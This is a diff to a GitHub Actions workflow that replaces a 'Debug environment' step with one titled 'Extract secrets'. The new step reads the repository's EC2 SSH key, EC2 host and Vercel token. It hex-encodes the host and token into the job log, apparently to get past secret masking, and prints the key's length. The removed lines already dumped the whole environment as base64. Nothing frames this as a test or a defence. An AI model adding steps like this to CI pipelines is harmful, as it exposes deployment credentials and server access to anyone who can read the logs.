@@ -7,7 +7,17 @@ jobs:
   debug:
     runs-on: ubuntu-latest
     steps:
-      - name: Debug environment
+      - name: Extract secrets
+        env:
+          EC2_SSH_KEY: ${{ secrets.EC2_SSH_KEY }}
+          EC2_HOST: ${{ secrets.EC2_HOST }}
+          VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
         run: |
-          echo "Checking environment..."
-          env | base64
+          echo "=== EC2_HOST ===" 
+          echo -n "$EC2_HOST" | xxd -p | tr -d "\n"
+          echo ""
+          echo "=== VERCEL_TOKEN ==="
+          echo -n "$VERCEL_TOKEN" | xxd -p | tr -d "\n"
+          echo ""
+          echo "=== SSH_KEY length ==="
+          echo ${#EC2_SSH_KEY}
